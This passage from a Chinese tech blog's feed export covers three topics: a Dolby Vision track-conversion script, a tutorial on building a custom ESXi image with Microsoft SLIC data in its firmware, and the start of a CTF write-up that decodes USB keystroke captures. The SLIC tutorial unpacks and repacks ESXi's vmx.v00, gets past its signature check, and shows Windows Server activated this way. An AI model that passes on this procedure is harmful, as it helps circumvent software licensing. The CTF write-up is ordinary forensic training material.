class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><br><span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$#</span>&quot;</span> -ne 1 ]; <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Usage: \$0 &lt;fileA&gt;&quot;</span><br>    <span class="hljs-built_in">exit</span> 1<br><span class="hljs-keyword">fi</span><br><br>fileA=<span class="hljs-string">&quot;<span class="hljs-variable">$1</span>&quot;</span><br><br>video_tracks=$(mkvmerge --identify <span class="hljs-string">&quot;<span class="hljs-variable">$fileA</span>&quot;</span> | grep <span class="hljs-string">&#x27;video&#x27;</span> | <span class="hljs-built_in">wc</span> -l)<br><br><span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$video_tracks</span>&quot;</span> -eq 1 ]; <span class="hljs-keyword">then</span><br>    mkvextract tracks <span class="hljs-string">&quot;<span class="hljs-variable">$fileA</span>&quot;</span> 0:BLEL.hevc<br>    dovi_tool -m 2 convert --discard BLEL.hevc &amp;&amp; <span class="hljs-built_in">rm</span> BLEL.hevc<br><span class="hljs-keyword">elif</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$video_tracks</span>&quot;</span> -eq 2 ]; <span class="hljs-keyword">then</span><br>    mkvextract tracks <span class="hljs-string">&quot;<span class="hljs-variable">$fileA</span>&quot;</span> 0:BL.hevc 1:EL.hevc<br>    dovi_tool -m 2 mux --discard --bl BL.hevc --el EL.hevc &amp;&amp; <span class="hljs-built_in">rm</span> BL.hevc EL.hevc<br><span class="hljs-keyword">else</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Unsupported number of video tracks: <span class="hljs-variable">$video_tracks</span>&quot;</span><br>    <span class="hljs-built_in">exit</span> 2<br><span class="hljs-keyword">fi</span><br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Dolby Vision </tag>
            
            <tag> HEVC </tag>
            
            <tag> HDR </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>为 ESXi 集成 SLIC 以及其他自定义 (6.7-8.0)</title>
      <link href="/2022/12/03/%E4%B8%BAESXi%E9%9B%86%E6%88%90SLIC%E4%BB%A5%E5%8F%8A%E5%85%B6%E4%BB%96%E8%87%AA%E5%AE%9A%E4%B9%89(6.7-8.0)/"/>
      <url>/2022/12/03/%E4%B8%BAESXi%E9%9B%86%E6%88%90SLIC%E4%BB%A5%E5%8F%8A%E5%85%B6%E4%BB%96%E8%87%AA%E5%AE%9A%E4%B9%89(6.7-8.0)/</url>
      
        <content type="html"><![CDATA[<h2 id="SLIC-是什么"><a href="#SLIC-是什么" class="headerlink" title="SLIC 是什么"></a>SLIC 是什么</h2><p><strong>SLIC ( Software Licensing Internal Code)</strong> 是微软在合作的 OEM 厂商主板BIOS中写入的特定信息，用于激活 OEM 版本的 Windows。当前最新的 SLIC 版本为2.6, 可以激活最新的 Windows Server 2022 LTSC。</p><h2 id="集成进-VMware-产品"><a href="#集成进-VMware-产品" class="headerlink" title="集成进 VMware 产品"></a>集成进 VMware 产品</h2><p>VMware 产品当然有自己的 BIOS 或 EFI 固件，我们可以提取 OEM 厂商固件中的 SLIC 信息并写入到 VMware 的固件中，提取和写入的过程本文不进行叙述，相关成品和教程可以在各大网站搜索到，本文重点叙述如何将修改好的固件写入 VMware 产品中。</p><h3 id="Workstation-和-Fusion"><a href="#Workstation-和-Fusion" class="headerlink" title="Workstation 和 Fusion"></a>Workstation 和 Fusion</h3><p>VMware 面向桌面端的产品主要是 Workstation (Windows &amp; Linux) 和 Fusion (macOS)，这两款产品替换 BIOS 非常简单，直接将安装目录下的 <code>BIOS.440.ROM</code>, <code>EFI64.ROM</code>, <code>EFI20-64.ROM</code> 替换为修改好的对应固件即可。</p><p>而 ESXi 由于涉及到一个类似 SIP 的机制，一般情况下无法替换而且替换后重启会被原文件覆盖，6.7版本后无法使用直接替换文件的方法</p><h3 id="ESXi"><a href="#ESXi" class="headerlink" title="ESXi"></a>ESXi</h3><p>ESXi 的 ROM 文件位于 <code>/usr/lib/vmware/roms</code> 下，ESXi开机时会解压 <code>/bootbank/vmx.v00</code> 并替换关键的系统文件，其中包括了 <code>roms</code> 目录，也就是说我们只需要替换 <code>vmx.v00</code> 中的固件就可以完成修改了。而 ESXi8 收紧了 <code>/bootbank/vmx.v00</code> 的权限，不再可以直接更改，只能更改安装镜像中的 <code>vmx.v00</code> 文件，这样安装后的 <code>/bootbank/vmx.v00</code> 就是我们已经改好的版本。</p><p>v00 文件本质上是经过多重打包的，但是有一些压缩方式是 ESXi 独有的，我们需要在 ESXi 上操作：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> <span class="hljs-string">&quot;/vmfs/volumes/datastore1/vmvisor-sys/&quot;</span><br><span class="hljs-built_in">mkdir</span> <span class="hljs-string">&quot;/vmfs/volumes/datastore1/tmp/&quot;</span><br><span class="hljs-built_in">mkdir</span> <span class="hljs-string">&quot;/vmfs/volumes/datastore1/tmp/vmvisor-sys/&quot;</span><br><span class="hljs-built_in">cp</span> <span class="hljs-string">&quot;/bootbank/vmx.v00&quot;</span> <span class="hljs-string">&quot;/vmfs/volumes/datastore1/vmvisor-sys/vmx.gz&quot;</span><br>pigz -d <span class="hljs-string">&quot;/vmfs/volumes/datastore1/vmvisor-sys/vmx.gz&quot;</span><br>sigfilesize=$(<span class="hljs-built_in">wc</span> -c &lt; <span class="hljs-string">&quot;/usr/share/weasel/s.sigblob&quot;</span>); \<br>sysfilesize=$(<span class="hljs-built_in">wc</span> -c &lt; <span class="hljs-string">&quot;/vmfs/volumes/datastore1/vmvisor-sys/vmx&quot;</span>); \<br><span class="hljs-built_in">head</span> -c $((sysfilesize-sigfilesize)) <span class="hljs-string">&quot;/vmfs/volumes/datastore1/vmvisor-sys/vmx&quot;</span> &gt; <span class="hljs-string">&quot;/vmfs/volumes/datastore1/vmvisor-sys/vmx-nosig.xz&quot;</span><br>xz -d <span class="hljs-string">&quot;/vmfs/volumes/datastore1/vmvisor-sys/vmx-nosig.xz&quot;</span><br>vmtar -x <span class="hljs-string">&quot;/vmfs/volumes/datastore1/vmvisor-sys/vmx-nosig&quot;</span> -o <span class="hljs-string">&quot;/vmfs/volumes/datastore1/vmvisor-sys/vmx.tar&quot;</span><br>tar xf <span class="hljs-string">&quot;/vmfs/volumes/datastore1/vmvisor-sys/vmx.tar&quot;</span> -C <span class="hljs-string">&quot;/vmfs/volumes/datastore1/tmp/vmvisor-sys/&quot;</span><br></code></pre></td></tr></table></figure><p>这时候已经把当前系统的 vmx.v00 解压到 <code>/vmfs/volumes/datastore1/tmp/vmvisor-sys/</code> 目录了，我们可以在 <code>/vmfs/volumes/datastore1/tmp/vmvisor-sys/usr/lib/vmware/roms</code> 找到固件并替换，替换后我们需要修改被替换文件的权限：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> 755 /vmfs/volumes/datastore1/tmp/vmvisor-sys/usr/lib/vmware/roms/EFI64.ROM<br><span class="hljs-built_in">chmod</span> 755 /vmfs/volumes/datastore1/tmp/vmvisor-sys/usr/lib/vmware/roms/EFI20-64.ROM<br><span class="hljs-built_in">chmod</span> u+s /vmfs/volumes/datastore1/tmp/vmvisor-sys/usr/lib/vmware/roms/BIOS.440.ROM<br><span class="hljs-built_in">chmod</span> u+s /vmfs/volumes/datastore1/tmp/vmvisor-sys/usr/lib/vmware/roms/EFI64.ROM<br><span class="hljs-built_in">chmod</span> u+s /vmfs/volumes/datastore1/tmp/vmvisor-sys/usr/lib/vmware/roms/EFI20-64.ROM<br><span class="hljs-built_in">chown</span> 201:201 /vmfs/volumes/datastore1/tmp/vmvisor-sys/usr/lib/vmware/roms/BIOS.440.ROM<br><span class="hljs-built_in">chown</span> 201:201 /vmfs/volumes/datastore1/tmp/vmvisor-sys/usr/lib/vmware/roms/EFI64.ROM<br><span class="hljs-built_in">chown</span> 201:201 /vmfs/volumes/datastore1/tmp/vmvisor-sys/usr/lib/vmware/roms/EFI20-64.ROM<br></code></pre></td></tr></table></figure><p>打包：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">rm</span> -R <span class="hljs-string">&quot;/vmfs/volumes/datastore1/vmvisor-sys/&quot;</span><br><span class="hljs-built_in">mkdir</span> <span class="hljs-string">&quot;/vmfs/volumes/datastore1/vmvisor-sys/&quot;</span><br><span class="hljs-built_in">cd</span> <span class="hljs-string">&quot;/vmfs/volumes/datastore1/tmp/vmvisor-sys/&quot;</span>; \<br>tar cf <span class="hljs-string">&quot;/vmfs/volumes/datastore1/vmvisor-sys/vmx.tar&quot;</span> *<br>vmtar -c <span class="hljs-string">&quot;/vmfs/volumes/datastore1/vmvisor-sys/vmx.tar&quot;</span> -o <span class="hljs-string">&quot;/vmfs/volumes/datastore1/vmvisor-sys/vmx-nosig&quot;</span><br></code></pre></td></tr></table></figure><p>运行完成后会报错，是 ESXi 的安全机制，可以忽略，继续打包：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">xz --compress --stdout --lzma2=dict=2048KiB --check=crc32 --threads=8 <span class="hljs-string">&quot;/vmfs/volumes/datastore1/vmvisor-sys/vmx-nosig&quot;</span> &gt; <span class="hljs-string">&quot;/vmfs/volumes/datastore1/vmvisor-sys/vmx&quot;</span><br><span class="hljs-built_in">cat</span> <span class="hljs-string">&quot;/usr/share/weasel/s.sigblob&quot;</span> &gt;&gt; <span class="hljs-string">&quot;/vmfs/volumes/datastore1/vmvisor-sys/vmx&quot;</span><br>pigz -9 -p 60 -n -T <span class="hljs-string">&quot;/vmfs/volumes/datastore1/vmvisor-sys/vmx&quot;</span><br></code></pre></td></tr></table></figure><p>此时我们可以得到 <code>/vmfs/volumes/datastore1/vmvisor-sys/vmx.gz</code> 文件，这个就是 <code>vmx.v00</code> 了，我们可以直接重命名为 <code>vmx.v00</code>，后续我们再使用 UltraISO 替换<strong>对应版本</strong>的安装镜像即可。</p><p>此外我们还可以编辑 <code>BOOT.CFG</code>, <code>EFI/BOOT/BOOT.CFG</code>，加入 <code>allowLegacyCPU=true autoPartitionOSDataSize=4096 cpuUniformityHardCheckPanic=false</code> 等参数优化系统安装并提高兼容性。</p><p>至此，我们已经制作好了包含 SLIC 的自定义 ESXi 镜像，即装即用。</p><p><img src="https://cdn.starryloki.com/2023/11/2507e98951cbc0c602093553b18fec9b.png" alt="SLIC2.6激活的Windows Server"></p><p>SLIC2.6激活的Windows Server 2022</p>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> VMware </tag>
            
            <tag> SLIC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络威胁数据联盟暑期班CTF WP</title>
      <link href="/2021/09/07/%E7%BD%91%E7%BB%9C%E5%A8%81%E8%83%81%E6%95%B0%E6%8D%AE%E8%81%94%E7%9B%9F%E6%9A%91%E6%9C%9F%E7%8F%ADCTF%20WP/"/>
      <url>/2021/09/07/%E7%BD%91%E7%BB%9C%E5%A8%81%E8%83%81%E6%95%B0%E6%8D%AE%E8%81%94%E7%9B%9F%E6%9A%91%E6%9C%9F%E7%8F%ADCTF%20WP/</url>
      
        <content type="html"><![CDATA[<h3 id="hidehight"><a href="#hidehight" class="headerlink" title="hidehight"></a>hidehight</h3><p>利用binwalk获取隐藏文件</p><p><img src="https://cdn.starryloki.com/2023/11/fe12e7548f71ede33a63af8201b3a02d.png" alt="image-20210825182107923"></p><p>弱口令：1234打开zip得到logo1.png.</p><p>再windows下用winhex</p><p><img src="https://cdn.starryloki.com/2023/11/e2a99773dca167e6bf615e466d169311.png" alt="image-20210825182151423"></p><p>最终得到</p><p><img src="https://cdn.starryloki.com/2023/11/87cd5a51e328099bf1258c70ac5d204c.png" alt="image-20210825182207022"></p><h3 id="easyusb"><a href="#easyusb" class="headerlink" title="easyusb"></a>easyusb</h3><p>得到一份记录usb的流量记录, 利用tshark提取流量:</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">tshark -T json -r usb.pcapng &gt; usb.json<br></code></pre></td></tr></table></figure><p>提取后grep筛选出usb.hid的值, 并构造脚本分析:</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding:utf-8 -*-</span><br><br>normalKeys = &#123;<span class="hljs-string">&quot;04&quot;</span>:<span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;05&quot;</span>:<span class="hljs-string">&quot;b&quot;</span>, <span class="hljs-string">&quot;06&quot;</span>:<span class="hljs-string">&quot;c&quot;</span>, <span class="hljs-string">&quot;07&quot;</span>:<span class="hljs-string">&quot;d&quot;</span>, <span class="hljs-string">&quot;08&quot;</span>:<span class="hljs-string">&quot;e&quot;</span>, <span class="hljs-string">&quot;09&quot;</span>:<span class="hljs-string">&quot;f&quot;</span>, <span class="hljs-string">&quot;0a&quot;</span>:<span class="hljs-string">&quot;g&quot;</span>, <span class="hljs-string">&quot;0b&quot;</span>:<span class="hljs-string">&quot;h&quot;</span>, <span class="hljs-string">&quot;0c&quot;</span>:<span class="hljs-string">&quot;i&quot;</span>, <span class="hljs-string">&quot;0d&quot;</span>:<span class="hljs-string">&quot;j&quot;</span>, <span class="hljs-string">&quot;0e&quot;</span>:<span class="hljs-string">&quot;k&quot;</span>, <span class="hljs-string">&quot;0f&quot;</span>:<span class="hljs-string">&quot;l&quot;</span>, <span class="hljs-string">&quot;10&quot;</span>:<span class="hljs-string">&quot;m&quot;</span>, <span class="hljs-string">&quot;11&quot;</span>:<span class="hljs-string">&quot;n&quot;</span>, <span class="hljs-string">&quot;12&quot;</span>:<span class="hljs-string">&quot;o&quot;</span>, <span class="hljs-string">&quot;13&quot;</span>:<span class="hljs-string">&quot;p&quot;</span>, <span class="hljs-string">&quot;14&quot;</span>:<span class="hljs-string">&quot;q&quot;</span>, <span class="hljs-string">&quot;15&quot;</span>:<span class="hljs-string">&quot;r&quot;</span>, <span class="hljs-string">&quot;16&quot;</span>:<span class="hljs-string">&quot;s&quot;</span>, <span class="hljs-string">&quot;17&quot;</span>:<span class="hljs-string">&quot;t&quot;</span>, <span class="hljs-string">&quot;18&quot;</span>:<span class="hljs-string">&quot;u&quot;</span>, <span class="hljs-string">&quot;19&quot;</span>:<span class="hljs-string">&quot;v&quot;</span>, <span class="hljs-string">&quot;1a&quot;</span>:<span class="hljs-string">&quot;w&quot;</span>, <span class="hljs-string">&quot;1b&quot;</span>:<span class="hljs-string">&quot;x&quot;</span>, <span class="hljs-string">&quot;1c&quot;</span>:<span class="hljs-string">&quot;y&quot;</span>, <span class="hljs-string">&quot;1d&quot;</span>:<span class="hljs-string">&quot;z&quot;</span>,<span class="hljs-string">&quot;1e&quot;</span>:<span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;1f&quot;</span>:<span class="hljs-string">&quot;2&quot;</span>, <span class="hljs-string">&quot;20&quot;</span>:<span class="hljs-string">&quot;3&quot;</span>, <span class="hljs-string">&quot;21&quot;</span>:<span class="hljs-string">&quot;4&quot;</span>, <span class="hljs-string">&quot;22&quot;</span>:<span class="hljs-string">&quot;5&quot;</span>, <span class="hljs-string">&quot;23&quot;</span>:<span class="hljs-string">&quot;6&quot;</span>,<span class="hljs-string">&quot;24&quot;</span>:<span class="hljs-string">&quot;7&quot;</span>,<span class="hljs-string">&quot;25&quot;</span>:<span class="hljs-string">&quot;8&quot;</span>,<span class="hljs-string">&quot;26&quot;</span>:<span class="hljs-string">&quot;9&quot;</span>,<span class="hljs-string">&quot;27&quot;</span>:<span class="hljs-string">&quot;0&quot;</span>,<span class="hljs-string">&quot;28&quot;</span>:<span class="hljs-string">&quot;&lt;RET&gt;&quot;</span>,<span class="hljs-string">&quot;29&quot;</span>:<span class="hljs-string">&quot;&lt;ESC&gt;&quot;</span>,<span class="hljs-string">&quot;2a&quot;</span>:<span class="hljs-string">&quot;&lt;DEL&gt;&quot;</span>, <span class="hljs-string">&quot;2b&quot;</span>:<span class="hljs-string">&quot;\t&quot;</span>,<span class="hljs-string">&quot;2c&quot;</span>:<span class="hljs-string">&quot;&lt;SPACE&gt;&quot;</span>,<span class="hljs-string">&quot;2d&quot;</span>:<span class="hljs-string">&quot;-&quot;</span>,<span class="hljs-string">&quot;2e&quot;</span>:<span class="hljs-string">&quot;=&quot;</span>,<span class="hljs-string">&quot;2f&quot;</span>:<span class="hljs-string">&quot;[&quot;</span>,<span class="hljs-string">&quot;30&quot;</span>:<span class="hljs-string">&quot;]&quot;</span>,<span class="hljs-string">&quot;31&quot;</span>:<span class="hljs-string">&quot;\\&quot;</span>,<span class="hljs-string">&quot;32&quot;</span>:<span class="hljs-string">&quot;&lt;NON&gt;&quot;</span>,<span class="hljs-string">&quot;33&quot;</span>:<span class="hljs-string">&quot;;&quot;</span>,<span class="hljs-string">&quot;34&quot;</span>:<span class="hljs-string">&quot;&#x27;&quot;</span>,<span class="hljs-string">&quot;35&quot;</span>:<span class="hljs-string">&quot;&lt;GA&gt;&quot;</span>,<span class="hljs-string">&quot;36&quot;</span>:<span class="hljs-string">&quot;,&quot;</span>,<span class="hljs-string">&quot;37&quot;</span>:<span class="hljs-string">&quot;.&quot;</span>,<span class="hljs-string">&quot;38&quot;</span>:<span class="hljs-string">&quot;/&quot;</span>,<span class="hljs-string">&quot;39&quot;</span>:<span class="hljs-string">&quot;&lt;CAP&gt;&quot;</span>,<span class="hljs-string">&quot;3a&quot;</span>:<span class="hljs-string">&quot;&lt;F1&gt;&quot;</span>,<span class="hljs-string">&quot;3b&quot;</span>:<span class="hljs-string">&quot;&lt;F2&gt;&quot;</span>, <span class="hljs-string">&quot;3c&quot;</span>:<span class="hljs-string">&quot;&lt;F3&gt;&quot;</span>,<span class="hljs-string">&quot;3d&quot;</span>:<span class="hljs-string">&quot;&lt;F4&gt;&quot;</span>,<span class="hljs-string">&quot;3e&quot;</span>:<span class="hljs-string">&quot;&lt;F5&gt;&quot;</span>,<span class="hljs-string">&quot;3f&quot;</span>:<span class="hljs-string">&quot;&lt;F6&gt;&quot;</span>,<span class="hljs-string">&quot;40&quot;</span>:<span class="hljs-string">&quot;&lt;F7&gt;&quot;</span>,<span class="hljs-string">&quot;41&quot;</span>:<span class="hljs-string">&quot;&lt;F8&gt;&quot;</span>,<span class="hljs-string">&quot;42&quot;</span>:<span class="hljs-string">&quot;&lt;F9&gt;&quot;</span>,<span class="hljs-string">&quot;43&quot;</span>:<span class="hljs-string">&quot;&lt;F10&gt;&quot;</span>,<span class="hljs-string">&quot;44&quot;</span>:<span class="hljs-string">&quot;&lt;F11&gt;&quot;</span>,<span class="hljs-string">&quot;45&quot;</span>:<span class="hljs-string">&quot;&lt;F12&gt;&quot;</span>&#125;<br>shiftKeys = &#123;<span class="hljs-string">&quot;04&quot;</span>:<span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-string">&quot;05&quot;</span>:<span class="hljs-string">&quot;B&quot;</span>, <span class="hljs-string">&quot;06&quot;</span>:<span class="hljs-string">&quot;C&quot;</span>, <span class="hljs-string">&quot;07&quot;</span>:<span class="hljs-string">&quot;D&quot;</span>, <span class="hljs-string">&quot;08&quot;</span>:<span class="hljs-string">&quot;E&quot;</span>, <span class="hljs-string">&quot;09&quot;</span>:<span class="hljs-string">&quot;F&quot;</span>, <span class="hljs-string">&quot;0a&quot;</span>:<span class="hljs-string">&quot;G&quot;</span>, <span class="hljs-string">&quot;0b&quot;</span>:<span class="hljs-string">&quot;H&quot;</span>, <span class="hljs-string">&quot;0c&quot;</span>:<span class="hljs-string">&quot;I&quot;</span>, <span class="hljs-string">&quot;0d&quot;</span>:<span class="hljs-string">&quot;J&quot;</span>, <span class="hljs-string">&quot;0e&quot;</span>:<span class="hljs-string">&quot;K&quot;</span>, <span class="hljs-string">&quot;0f&quot;</span>:<span class="hljs-string">&quot;L&quot;</span>, <span class="hljs-string">&quot;10&quot;</span>:<span class="hljs-string">&quot;M&quot;</span>, <span class="hljs-string">&quot;11&quot;</span>:<span class="hljs-string">&quot;N&quot;</span>, <span class="hljs-string">&quot;12&quot;</span>:<span class="hljs-string">&quot;O&quot;</span>, <span class="hljs-string">&quot;13&quot;</span>:<span class="hljs-string">&quot;P&quot;</span>, <span class="hljs-string">&quot;14&quot;</span>:<span class="hljs-string">&quot;Q&quot;</span>, <span class="hljs-string">&quot;15&quot;</span>:<span class="hljs-string">&quot;R&quot;</span>, <span class="hljs-string">&quot;16&quot;</span>:<span class="hljs-string">&quot;S&quot;</span>, <span class="hljs-string">&quot;17&quot;</span>:<span class="hljs-string">&quot;T&quot;</span>, <span class="hljs-string">&quot;18&quot;</span>:<span class="hljs-string">&quot;U&quot;</span>, <span class="hljs-string">&quot;19&quot;</span>:<span class="hljs-string">&quot;V&quot;</span>, <span class="hljs-string">&quot;1a&quot;</span>:<span class="hljs-string">&quot;W&quot;</span>, <span class="hljs-string">&quot;1b&quot;</span>:<span class="hljs-string">&quot;X&quot;</span>, <span class="hljs-string">&quot;1c&quot;</span>:<span class="hljs-string">&quot;Y&quot;</span>, <span class="hljs-string">&quot;1d&quot;</span>:<span class="hljs-string">&quot;Z&quot;</span>,<span class="hljs-string">&quot;1e&quot;</span>:<span class="hljs-string">&quot;!&quot;</span>, <span class="hljs-string">&quot;1f&quot;</span>:<span class="hljs-string">&quot;@&quot;</span>, <span class="hljs-string">&quot;20&quot;</span>:<span class="hljs-string">&quot;#&quot;</span>, <span class="hljs-string">&quot;21&quot;</span>:<span class="hljs-string">&quot;$&quot;</span>, <span class="hljs-string">&quot;22&quot;</span>:<span class="hljs-string">&quot;%&quot;</span>, <span class="hljs-string">&quot;23&quot;</span>:<span class="hljs-string">&quot;^&quot;</span>,<span class="hljs-string">&quot;24&quot;</span>:<span class="hljs-string">&quot;&amp;&quot;</span>,<span class="hljs-string">&quot;25&quot;</span>:<span class="hljs-string">&quot;*&quot;</span>,<span class="hljs-string">&quot;26&quot;</span>:<span class="hljs-string">&quot;(&quot;</span>,<span class="hljs-string">&quot;27&quot;</span>:<span class="hljs-string">&quot;)&quot;</span>,<span class="hljs-string">&quot;28&quot;</span>:<span class="hljs-string">&quot;&lt;RET&gt;&quot;</span>,<span class="hljs-string">&quot;29&quot;</span>:<span class="hljs-string">&quot;&lt;ESC&gt;&quot;</span>,<span class="hljs-string">&quot;2a&quot;</span>:<span class="hljs-string">&quot;&lt;DEL&gt;&quot;</span>, <span class="hljs-string">&quot;2b&quot;</span>:<span class="hljs-string">&quot;\t&quot;</span>,<span class="hljs-string">&quot;2c&quot;</span>:<span class="hljs-string">&quot;&lt;SPACE&gt;&quot;</span>,<span class="hljs-string">&quot;2d&quot;</span>:<span class="hljs-string">&quot;_&quot;</span>,<span class="hljs-string">&quot;2e&quot;</span>:<span class="hljs-string">&quot;+&quot;</span>,<span class="hljs-string">&quot;2f&quot;</span>:<span class="hljs-string">&quot;&#123;&quot;</span>,<span class="hljs-string">&quot;30&quot;</span>:<span class="hljs-string">&quot;&#125;&quot;</span>,<span class="hljs-string">&quot;31&quot;</span>:<span class="hljs-string">&quot;|&quot;</span>,<span class="hljs-string">&quot;32&quot;</span>:<span class="hljs-string">&quot;&lt;NON&gt;&quot;</span>,<span class="hljs-string">&quot;33&quot;</span>:<span class="hljs-string">&quot;\&quot;&quot;</span>,<span class="hljs-string">&quot;34&quot;</span>:<span class="hljs-string">&quot;:&quot;</span>,<span class="hljs-string">&quot;35&quot;</span>:<span class="hljs-string">&quot;&lt;GA&gt;&quot;</span>,<span class="hljs-string">&quot;36&quot;</span>:<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;37&quot;</span>:<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;38&quot;</span>:<span class="hljs-string">&quot;?&quot;</span>,<span class="hljs-string">&quot;39&quot;</span>:<span class="hljs-string">&quot;&lt;CAP&gt;&quot;</span>,<span class="hljs-string">&quot;3a&quot;</span>:<span class="hljs-string">&quot;&lt;F1&gt;&quot;</span>,<span class="hljs-string">&quot;3b&quot;</span>:<span class="hljs-string">&quot;&lt;F2&gt;&quot;</span>, <span class="hljs-string">&quot;3c&quot;</span>:<span class="hljs-string">&quot;&lt;F3&gt;&quot;</span>,<span class="hljs-string">&quot;3d&quot;</span>:<span class="hljs-string">&quot;&lt;F4&gt;&quot;</span>,<span class="hljs-string">&quot;3e&quot;</span>:<span class="hljs-string">&quot;&lt;F5&gt;&quot;</span>,<span class="hljs-string">&quot;3f&quot;</span>:<span class="hljs-string">&quot;&lt;F6&gt;&quot;</span>,<span class="hljs-string">&quot;40&quot;</span>:<span class="hljs-string">&quot;&lt;F7&gt;&quot;</span>,<span class="hljs-string">&quot;41&quot;</span>:<span class="hljs-string">&quot;&lt;F8&gt;&quot;</span>,<span class="hljs-string">&quot;42&quot;</span>:<span class="hljs-string">&quot;&lt;F9&gt;&quot;</span>,<span class="hljs-string">&quot;43&quot;</span>:<span class="hljs-string">&quot;&lt;F10&gt;&quot;</span>,<span class="hljs-string">&quot;44&quot;</span>:<span class="hljs-string">&quot;&lt;F11&gt;&quot;</span>,<span class="hljs-string">&quot;45&quot;</span>:<span class="hljs-string">&quot;&lt;F12&gt;&quot;</span>&#125;<br>output = []<br>keys = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;usb.txt&#x27;</span>)<br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> keys:<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> line[<span class="hljs-number">0</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> (line[<span class="hljs-number">1</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">and</span> line[<span class="hljs-number">1</span>]!=<span class="hljs-string">&#x27;2&#x27;</span>) <span class="hljs-keyword">or</span> line[<span class="hljs-number">3</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">4</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">9</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">10</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">12</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">13</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">15</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">16</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">18</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">19</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">21</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">22</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>]==<span class="hljs-string">&quot;00&quot;</span>:<br>             <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">if</span> line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>] <span class="hljs-keyword">in</span> normalKeys.keys():<br>            output += [[normalKeys[line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>]]],[shiftKeys[line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>]]]][line[<span class="hljs-number">1</span>]==<span class="hljs-string">&#x27;2&#x27;</span>]<br>        <span class="hljs-keyword">else</span>:<br>            output += [<span class="hljs-string">&#x27;[unknown]&#x27;</span>]<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br>keys.close()<br><br>flag=<span class="hljs-number">0</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>.join(output))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(output)):<br>    <span class="hljs-keyword">try</span>:<br>        a=output.index(<span class="hljs-string">&#x27;&lt;DEL&gt;&#x27;</span>)<br>        <span class="hljs-keyword">del</span> output[a]<br>        <span class="hljs-keyword">del</span> output[a-<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(output)):<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> output[i]==<span class="hljs-string">&quot;&lt;CAP&gt;&quot;</span>:<br>            flag+=<span class="hljs-number">1</span><br>            output.pop(i)<br>            <span class="hljs-keyword">if</span> flag==<span class="hljs-number">2</span>:<br>                flag=<span class="hljs-number">0</span><br>        <span class="hljs-keyword">if</span> flag!=<span class="hljs-number">0</span>:<br>            output[i]=output[i].upper()<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br><span class="hljs-built_in">print</span> (<span class="hljs-string">&#x27;output :&#x27;</span> + <span 